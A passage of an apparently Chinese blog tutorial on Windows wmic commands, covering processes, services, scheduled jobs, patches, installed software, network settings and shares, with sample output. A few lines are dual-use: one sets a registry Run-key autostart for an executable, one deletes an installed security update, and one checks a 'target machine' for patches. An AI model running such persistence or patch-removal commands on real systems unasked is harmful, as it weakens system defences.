Name=WindowsTerminal.exe</span></span><br><span class="line"><span class="comment"># ProcessId=11112</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># - 直接获取其值不显示其头部</span></span><br><span class="line">wmic process get caption,commandline /value</span><br><span class="line"><span class="comment"># Caption=bash.exe</span></span><br><span class="line"><span class="comment"># CommandLine="D:\Program Files\Git\usr\bin\bash.exe"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.调用call进行创建进程、终止进程、删除进程、开启与关闭服务</span></span><br><span class="line">wmic process call create calc </span><br><span class="line">wmic process call create shutdown.exe <span class="comment">#关闭本地计算机</span></span><br><span class="line">wmic process call create <span class="string">"C:\Windows\System32\notepad.exe"</span>   <span class="comment">#新建notepad进程 或者 该路径有空格的情况下 "C:\Program Files\Tencent\QQ\QQ.exe"</span></span><br><span class="line">wmic process <span class="built_in">where</span> name=<span class="string">"explorer.exe"</span> call terminate </span><br><span class="line">wmic process <span class="built_in">where</span> name=<span class="string">"notepad.exe"</span> delete</span><br><span class="line">  <span class="comment"># 删除实例 \\WEIYIGEEK\ROOT\CIMV2:Win32_Process.Handle="31788" 实例删除成功。</span></span><br><span class="line">wmic service <span class="built_in">where</span> <span class="string">"name='SERVERNAME'"</span> call startservice <span class="comment"># 开启服务</span></span><br><span class="line">wmic service <span class="built_in">where</span> <span class="string">"name='SERVERNAME'"</span> call stopservice  <span class="comment"># 关闭服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#4.过滤进程显示信息</span></span><br><span class="line">wmic process <span class="built_in">where</span> <span class="string">"name='svchost.exe'"</span> get ExecutablePath</span><br><span class="line">wmic process <span class="built_in">where</span> <span class="string">"name='wechat.exe'"</span> list full   <span class="comment"># 显示QQ进程的全部信息</span></span><br><span class="line"><span class="comment"># CommandLine="D:\Program Files (x86)\Tencent\WeChat\WeChat.exe"</span></span><br><span class="line"><span class="comment"># CSName=WEIYIGEEK</span></span><br><span class="line"><span class="comment"># Description=WeChat.exe</span></span><br><span class="line"><span class="comment"># ExecutablePath=D:\Program Files (x86)\Tencent\WeChat\WeChat.exe</span></span><br><span class="line"><span class="comment"># ExecutionState=</span></span><br><span class="line"><span class="comment"># Handle=10452</span></span><br><span class="line"><span class="comment"># HandleCount=1188</span></span><br><span class="line"><span class="comment"># InstallDate=</span></span><br><span class="line"><span class="comment"># KernelModeTime=98750000</span></span><br><span class="line"><span class="comment"># MaximumWorkingSetSize=126004</span></span><br><span class="line"><span class="comment"># MinimumWorkingSetSize=124824</span></span><br><span class="line"><span class="comment"># Name=WeChat.exe</span></span><br><span class="line"><span class="comment"># OSName=Microsoft Windows 10 专业版|C:\Windows|\Device\Harddisk0\Partition3</span></span><br><span class="line">wmic service <span class="built_in">where</span> <span class="string">"state='running'"</span> list brief    <span class="comment"># 查看运行中的服务</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#5.关闭指定进程，执行下面的命令将关闭正在运行的QQ.exe：</span></span><br><span class="line">wmic process <span class="built_in">where</span> <span class="string">"name='wechat.exe'"</span> call terminate </span><br><span class="line"><span class="comment">#结束svchost.exe进程,路径为非C:\WINDOWS\system32\svchost.exe的</span></span><br><span class="line">wmic process <span class="built_in">where</span> <span class="string">"name='svchost.exe' and ExecutablePath&lt;&gt;'C:\\WINDOWS\\system32\\svchost.exe'"</span> call Terminate  </span><br><span class="line">wmic process 2345 call terminate <span class="comment">#删除指定进程</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#6.获取指定进程信息</span></span><br><span class="line">PS C:\Windows\System32\wbem&gt; wmic process <span class="built_in">where</span> <span class="string">"name='TIM.exe'"</span> call GetOwner</span><br><span class="line"><span class="comment"># 执行(\\WEIYIGEEK\ROOT\CIMV2:Win32_Process.Handle="3720")-&gt;GetOwner()</span></span><br><span class="line"><span class="comment"># 方法执行成功外参数:</span></span><br><span class="line"><span class="comment"># instance of __PARAMETERS</span></span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment">#         Domain = "WEIYIGEEK";</span></span><br><span class="line"><span class="comment">#         ReturnValue = 0;</span></span><br><span class="line"><span class="comment">#         User = "WeiyiGeek";</span></span><br><span class="line"><span class="comment"># &#125;;</span></span><br><span class="line"></span><br><span class="line">PS C:\Windows\System32\wbem&gt; wmic process <span class="built_in">where</span> <span class="string">"name='TIM.exe'"</span> call GetOwnerSid</span><br><span class="line"><span class="comment"># 执行(\\WEIYIGEEK\ROOT\CIMV2:Win32_Process.Handle="3720")-&gt;GetOwnerSid()</span></span><br><span class="line"><span class="comment"># 方法执行成功外参数:</span></span><br><span class="line"><span class="comment"># instance of __PARAMETERS</span></span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment">#         ReturnValue = 0;</span></span><br><span class="line"><span class="comment">#         Sid = "S-1-5-21-923396991-3399624210-3190802951-1001";</span></span><br><span class="line"><span class="comment"># &#125;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#7.精确查找与模糊查找</span></span><br><span class="line">wmic process <span class="built_in">where</span> caption=<span class="string">"notepad.exe"</span> get caption,commandline /value</span><br><span class="line">wmic process <span class="built_in">where</span>=<span class="string">"caption like 'notepad%'"</span> get caption,commandline /value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#8.删除满足多个条件的进程（可以利用Key值进行匹配）</span></span><br><span class="line">wmic process <span class="built_in">where</span> name=<span class="string">"'QQ.exe' and pid='123'"</span> delete     </span><br><span class="line"></span><br><span class="line"><span class="comment">#9.针对注册表的操作设置自启动</span></span><br><span class="line">wmic process call create <span class="string">"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v \"autorun\" /t REG_SZ /d \"C:\windows\autorun.exe\" /f"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#10.获取非%windows%目录下可执行文件列表</span></span><br><span class="line">wmic process <span class="built_in">where</span> <span class="string">"NOT ExecutablePath LIKE '%Windows%'"</span> GET ExecutablePath</span><br><span class="line">  <span class="comment"># ExecutablePath</span></span><br><span class="line">  <span class="comment"># C:\Program Files (x86)\Google\Chrome\Application\chrome.exe</span></span><br><span class="line">  <span class="comment"># C:\Program Files (x86)\Google\Chrome\Application\chrome.exe</span></span><br></pre></td></tr></table></figure><br><figure class="image-box">
                <a rel=wmic命令解析与实例 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115141024.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115141024.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p><em>补充：批处理</em><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">::以KB为单位显示进程占用内存</span><br><span class="line"><span class="keyword">for</span> /f <span class="string">"skip=1 tokens=1-2 delims= "</span> %%a <span class="keyword">in</span> (<span class="string">'wmic process where caption^="conime.exe" get WorkingSetSize^,PeakWorkingSetSize'</span>) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">set</span> /a m=%%a/1024</span><br><span class="line"><span class="built_in">set</span> /a mm=%%b/1024</span><br><span class="line"><span class="built_in">echo</span> 进程conime.exe现在占用内存：%m%K；最高占用内存：%mm%K</span><br><span class="line">)</span><br><span class="line">pause</span><br></pre></td></tr></table></figure></p>
<p><br></p>
<h3 id="service"><a href="#service" class="headerlink" title="service"></a>service</h3><p>描述:进行计算机服务程序管理效果比<code>net start/stop 服务名称</code>强大;<br>基础语法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">SERVICE ASSOC [&lt;format specifier&gt;]</span><br><span class="line">SERVICE CALL &lt;method name&gt; [&lt;actual param list&gt;]</span><br><span class="line">  * Change                  BOOLEAN/STRING/ARRAY OF STRING/UINT8  <span class="comment">#更改 crete 函数方法 创建的Key/VALUE</span></span><br><span class="line">  * ChangeStartMode         [IN ]StartMode(STRING)                  (null) <span class="comment">#更改启动模式</span></span><br><span class="line">  * Create                  [IN ]DesktopInteract(BOOLEAN)           (null)</span><br><span class="line">                          * [IN ]DisplayName(STRING)</span><br><span class="line">                          * [IN ]StartName(STRING)</span><br><span class="line">                          * [IN ]StartPassword(STRING)</span><br><span class="line">                          * [IN ]ErrorControl(UINT8)</span><br><span class="line">                          * [IN ]LoadOrderGroup(STRING)</span><br><span class="line">                          * [IN ]LoadOrderGroupDependencies(ARRAY OF STRING)</span><br><span class="line">                          * [IN ]Name(STRING)</span><br><span class="line">                          * [IN ]PathName(STRING)</span><br><span class="line">                          * [IN ]ServiceDependencies(ARRAY OF STRING)</span><br><span class="line">                          * [IN ]ServiceType(UINT8)</span><br><span class="line">                          * [IN ]StartMode(STRING)</span><br><span class="line">  * Delete                                                          (null)</span><br><span class="line">  * InterrogateService                                              (null)  <span class="comment">#中和服务</span></span><br><span class="line">  * PauseService                                                    (null)  <span class="comment">#暂停服务</span></span><br><span class="line">  * ResumeService                                                   (null)  <span class="comment">#服务摘要</span></span><br><span class="line">  * StartService                                                    (null)</span><br><span class="line">  * StopService                                                     (null)</span><br><span class="line">  * UserControlService      [IN ]ControlCode(UINT8)                 (null) <span class="comment">#用户控制服务</span></span><br><span class="line"></span><br><span class="line">SERVICE CREATE &lt;assign list&gt;</span><br><span class="line">SERVICE DELETE</span><br><span class="line">SERVICE GET [&lt;property list&gt;] [&lt;get switches&gt;]</span><br><span class="line">SERVICE LIST [&lt;list format&gt;] [&lt;list switches&gt;]</span><br></pre></td></tr></table></figure></p>
<p>基础实例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.案例：停止、暂停和运行服务功能</span></span><br><span class="line">wmic SERVICE <span class="built_in">where</span> name=<span class="string">"Spooler"</span> call startservice  <span class="comment">#运行spooler服务</span></span><br><span class="line">wmic SERVICE <span class="built_in">where</span> name=<span class="string">"Spooler"</span> call stopservice  <span class="comment">#运行spooler服务</span></span><br><span class="line">wmic SERVICE <span class="built_in">where</span> name=<span class="string">"Spooler"</span> call PauseService  <span class="comment">#暂停spooler服务</span></span><br><span class="line">wmic SERVICE <span class="built_in">where</span> name=<span class="string">"Spooler"</span> call delete   <span class="comment">#删除服务</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.更改spooler服务启动类型[auto|Disabled|Manual] 释[自动|禁用|手动]</span></span><br><span class="line">wmic SERVICE <span class="built_in">where</span> name=<span class="string">"Spooler"</span> <span class="built_in">set</span> StartMode=<span class="string">"auto"</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.caption 指定服务名进行过滤</span></span><br><span class="line">Service <span class="built_in">where</span> caption=<span class="string">"windows time"</span> call stopservice    <span class="comment">#停止服务  </span></span><br><span class="line">Service <span class="built_in">where</span> caption=<span class="string">"windows time"</span> call startservice   <span class="comment">#启动服务 </span></span><br><span class="line"><span class="comment">#停止服务,注意name和caption的区别（CMD中运行不能再Powershell中运行）</span></span><br><span class="line"><span class="built_in">echo</span> %ERRORLEVEL%   <span class="comment">#运行命令是否成功</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#4.服务信息摘要以及状态信息指定来过滤</span></span><br><span class="line">wmic service list brief</span><br><span class="line"><span class="comment"># ExitCode  Name                                      ProcessId  StartMode  State    Status</span></span><br><span class="line"><span class="comment"># 1077      AJRouter                                  0          Manual     Stopped  OK</span></span><br><span class="line"><span class="comment"># 0         Spooler                                   3480       Auto       Running  OK</span></span><br><span class="line">wmic service <span class="built_in">where</span> <span class="string">"State='Running'"</span> list brief</span><br><span class="line"></span><br><span class="line"><span class="comment">#5.创建一个服务(未找到)</span></span><br><span class="line">wmic service create /?:full <span class="comment">#获取帮助详细</span></span><br><span class="line">wmic service call create /?:full</span><br></pre></td></tr></table></figure></p>
<p>如:telnet服务的显示名称是 telnet 服务名称是tlntsvr, 还有Windows Time服务的名称是w32time <code>显示名称是&quot;Windows Time&quot;要用引号引起来</code> 主要是有一个空格。<br><figure class="image-box">
                <a rel=wmic命令解析与实例 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115143222.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115143222.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p><br></p>
<h3 id="job"><a href="#job" class="headerlink" title="job"></a>job</h3><p>描述:设置计算机的计划任务以及获取计划任务;<br>基础语法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>基础示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#0.查看创建的计划任务</span></span><br><span class="line">wmic job list brief</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.创建计划任务</span></span><br><span class="line">wmic job call create <span class="string">"notepad.exe"</span>,0,0,<span class="literal">true</span>,<span class="literal">false</span>,********154800.000000+480</span><br><span class="line">wmic job call create <span class="string">"explorer.exe"</span>,0,0,1,0,********154600.000000+480</span><br></pre></td></tr></table></figure></p>
<hr>

<h2 id="0x03-系统软件与补丁"><a href="#0x03-系统软件与补丁" class="headerlink" title="0x03 系统软件与补丁"></a>0x03 系统软件与补丁</h2><h3 id="qfe-查看系统补丁安装情况"><a href="#qfe-查看系统补丁安装情况" class="headerlink" title="qfe - 查看系统补丁安装情况"></a>qfe - 查看系统补丁安装情况</h3><p>基础语法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">QFE ASSOC [&lt;format specifier&gt;]</span><br><span class="line">QFE CREATE &lt;assign list&gt;</span><br><span class="line">QFE DELETE</span><br><span class="line">QFE GET [&lt;property list&gt;] [&lt;get switches&gt;]</span><br><span class="line">QFE LIST [&lt;list format&gt;] [&lt;list switches&gt;]</span><br></pre></td></tr></table></figure></p>
<p>实践案例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.查找目标机器是否安装了补丁信息</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | more</span><br><span class="line"><span class="comment"># Caption                                        Description      HotFixID   InstalledOn</span></span><br><span class="line"><span class="comment"># http://go.microsoft.com/fwlink/?LinkId=133041  Update           KB2849697  10/26/2016</span></span><br><span class="line"><span class="comment"># http://go.microsoft.com/fwlink/?LinkId=133041  Update           KB2849696  10/26/2016</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.删除已经安装的补丁</span></span><br><span class="line">wmic qfe <span class="built_in">where</span> <span class="string">"HotFixID='KB4497727'"</span> delete</span><br><span class="line"><span class="comment"># Caption                                     CSName     Description      FixComments  HotFixID   InstallDate  InstalledBy  InstalledOn  Name  ServicePackInEffect  Status</span></span><br><span class="line"><span class="comment"># http://support.microsoft.com/?kbid=4497727  WEIYIGEEK  Security Update               KB4497727                            4/1/2019</span></span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <a rel=wmic命令解析与实例 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115152233.png" target="_blank" title="WeiyiGeek.补丁安装情况" data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115152233.png" alt="WeiyiGeek.补丁安装情况" title="" class=""></a>
                <p>WeiyiGeek.补丁安装情况</p>
            </figure>
<p><br></p>
<h3 id="product-软件安装信息查看"><a href="#product-软件安装信息查看" class="headerlink" title="product - 软件安装信息查看"></a>product - 软件安装信息查看</h3><p>基础语法: 安装包在C:\WINDOWS\Installer目录下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PRODUCT ASSOC [&lt;format specifier&gt;]</span><br><span class="line">PRODUCT CALL &lt;method name&gt; [&lt;actual param list&gt;]</span><br><span class="line">PRODUCT CREATE &lt;assign list&gt;</span><br><span class="line">PRODUCT DELETE</span><br><span class="line">PRODUCT GET [&lt;property list&gt;] [&lt;get switches&gt;]</span><br><span class="line">PRODUCT LIST [&lt;list format&gt;] [&lt;list switches&gt;]</span><br></pre></td></tr></table></figure></p>
<p>简单示例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.系统已经安装的软件及其版本号</span></span><br><span class="line">wmic product get name,version </span><br><span class="line"></span><br><span class="line"><span class="comment">#2.表示将清单存储为 install.txt 并放在E 盘下 （比较特殊）</span></span><br><span class="line">wmic /output:E:\install.txt  product get name,version   </span><br><span class="line">        </span><br><span class="line"><span class="comment">#3.修复和卸载安装</span></span><br><span class="line">wmic PRODUCT <span class="built_in">where</span> <span class="string">"name='Microsoft .NET Framework 1.1' and Version='1.1.4322'"</span> call Uninstall <span class="comment">#卸载.msi安装包</span></span><br><span class="line">wmic PRODUCT <span class="built_in">where</span> <span class="string">"name='Microsoft .NET Framework 1.1' and Version='1.1.4322'"</span> call Reinstall <span class="comment">#修复.msi安装包</span></span><br><span class="line">wmic Product <span class="built_in">where</span> <span class="string">"name='电子摄像指纹采集'"</span> call Uninstall  <span class="comment">#静默卸载</span></span><br><span class="line"><span class="comment"># 执行(\\WEIYIGEEK\ROOT\CIMV2:Win32_Product.IdentifyingNumber="&#123;11314157-F5F7-41E7-A507-B700D2AC7F24&#125;",Name="电子摄像指纹</span></span><br><span class="line"><span class="comment"># 采集",Version="1.00.0000")-&gt;Uninstall()</span></span><br><span class="line"><span class="comment"># 方法执行成功。</span></span><br><span class="line"><span class="comment"># 外参数:</span></span><br><span class="line"><span class="comment"># instance of __PARAMETERS</span></span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment">#         ReturnValue = 1603;</span></span><br><span class="line"><span class="comment"># &#125;;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#4.安装软件信息简要查看</span></span><br><span class="line">wmic product List brief</span><br><span class="line"><span class="comment"># Caption              IdentifyingNumber          Name           Vendor           Version</span></span><br><span class="line"><span class="comment"># Office 16 Click-to-Run Extensibility Component                  &#123;90160000-008C-0000-1000-0000000FF1CE&#125;  Office 16 Click-to-Run Extensibility Component                  Microsoft Corporation         16.0.12130.20272</span></span><br><span class="line"><span class="comment"># Office 16 Click-to-Run Localization Component                   &#123;90160000-008C-0804-1000-0000000FF1CE&#125;  Office 16 Click-to-Run Localization Component                   Microsoft Corporation         16.0.12130.20272</span></span><br></pre></td></tr></table></figure></p>
<figure class="image-box">
                <a rel=wmic命令解析与实例 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115153224.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115153224.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure>
<hr>

<h2 id="0x04-网络设置"><a href="#0x04-网络设置" class="headerlink" title="0x04 网络设置"></a>0x04 网络设置</h2><h3 id="nicconfig"><a href="#nicconfig" class="headerlink" title="nicconfig"></a>nicconfig</h3><p>实例：利用 nicconfig 进行动态或者静态设置ip地址<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NICCONFIG ASSOC [&lt;格式说明符&gt;]</span><br><span class="line">NICCONFIG CALL &lt;方法名称&gt; [&lt;实际参数列表&gt;]</span><br><span class="line">NICCONFIG CREATE &lt;分配列表&gt;</span><br><span class="line">NICCONFIG DELETE</span><br><span class="line">NICCONFIG GET [&lt;属性列表&gt;] [&lt;获取开关&gt;]</span><br><span class="line">NICCONFIG LIST [&lt;列表格式&gt;] [&lt;列表开关&gt;]</span><br></pre></td></tr></table></figure></p>
<p>基础实例:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.网卡信息描述以及索引</span></span><br><span class="line">wmic nicconfig get SettingID,Description,index</span><br><span class="line"><span class="comment"># Description                                 Index  SettingID</span></span><br><span class="line"><span class="comment"># Microsoft Kernel Debug Network Adapter      0      &#123;7D257BDB-8307-4D9A-BD9B-58EE823EB375&#125;</span></span><br><span class="line"><span class="comment"># Intel(R) Ethernet Connection I217-LM        1      &#123;8EE7E18D-B6A7-4210-B0AF-55F446794580&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.设置自动获取或者静态IP地址设置根据条件设置</span></span><br><span class="line">wmic nicconfig <span class="built_in">where</span> index=13 call enabledhcp  <span class="comment">#动态获取IP地址</span></span><br><span class="line">wmic nicconfig <span class="built_in">where</span> index=0 call enablestatic(<span class="string">"192.168.1.5"</span>), (<span class="string">"255.255.255.0"</span>)  <span class="comment">#0说明是配置网络接口1。</span></span><br><span class="line">wmic nicconfig <span class="built_in">where</span> index=13 call setgateways(<span class="string">"192.168.1.1"</span>),(1)  <span class="comment">#配置网关（默认路由</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.指定字段获取(get 与 list 不能同时存在)</span></span><br><span class="line">wmic nicconfig get Description,IPAddress,DefaultIPGateway</span><br><span class="line"><span class="comment"># DefaultIPGateway  Description                                 IPAddress</span></span><br><span class="line"><span class="comment">#                   Microsoft Kernel Debug Network Adapter</span></span><br><span class="line"><span class="comment"># &#123;"192.20.172.1"&#125;   Intel(R) Ethernet Connection I217-LM        &#123;"192.20.172.109", "fe80::d97d:fe6c:10bf:4244"&#125;</span></span><br><span class="line"><span class="comment">#                   VMware Virtual Ethernet Adapter for VMnet1   &#123;"192.168.64.1", "fe80::34d5:4b52:1627:64dc"&#125;</span></span><br><span class="line"><span class="comment">#                   VMware Virtual Ethernet Adapter for VMnet8   &#123;"192.168.1.1", "fe80::50fc:1560:33a5:b73f"&#125;</span></span><br></pre></td></tr></table></figure><br><figure class="image-box">
                <a rel=wmic命令解析与实例 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115170247.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115170247.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<hr>

<h2 id="0x05-文件磁盘操作"><a href="#0x05-文件磁盘操作" class="headerlink" title="0x05 文件磁盘操作"></a>0x05 文件磁盘操作</h2><h3 id="share"><a href="#share" class="headerlink" title="share"></a>share</h3><p>描述:共享资源管理<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建参数</span></span><br><span class="line">Create                  [IN ]Access(OBJECT)                     (null)</span><br><span class="line">                        [IN ]Description(STRING)</span><br><span class="line">                        [IN ]MaximumAllowed(UINT32)</span><br><span class="line">                        [IN ]Name(STRING)</span><br><span class="line">                        [IN ]Password(STRING)</span><br><span class="line">                        [IN ]Path(STRING)</span><br><span class="line">                        [IN ]Type(UINT32)</span><br><span class="line">```       </span><br><span class="line"></span><br><span class="line">基础示例:</span><br><span class="line">```bash</span><br><span class="line"><span class="comment">#1.共享查看</span></span><br><span class="line">net share   <span class="comment">#查看自己的共享</span></span><br><span class="line">WMIC SHARE| findstr /n <span class="string">"OK"</span> <span class="comment">#查看自己的共享</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.共享的添加</span></span><br><span class="line">net share <span class="built_in">test</span>=d:\<span class="built_in">test</span></span><br><span class="line">WMIC SHARE CALL Create <span class="string">""</span>,<span class="string">"test"</span>,<span class="string">"3"</span>,<span class="string">"TestShareName"</span>,<span class="string">""</span>,<span class="string">"c:\test"</span>,0  <span class="comment">#添加共享</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.net share F$ /delete 也能删除共享</span></span><br><span class="line">wmic SHARE <span class="built_in">where</span> name=<span class="string">"Brother DCP-L5500D series"</span> call delete  <span class="comment">#删除共享</span></span><br></pre></td></tr></table></figure><br><figure class="image-box">
                <a rel=wmic命令解析与实例 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115174719.png" target="_blank" title="WeiyiGeek." data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191115174719.png" alt="WeiyiGeek." title="" class=""></a>
                <p>WeiyiGeek.</p>
            </figure></p>
<p><br></p>
<h3 id="datafile"><a href="#datafile" class="headerlink" title="datafile"></a>datafile</h3><p>描述:磁盘 DataFile 管理与操作<br>基础语法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 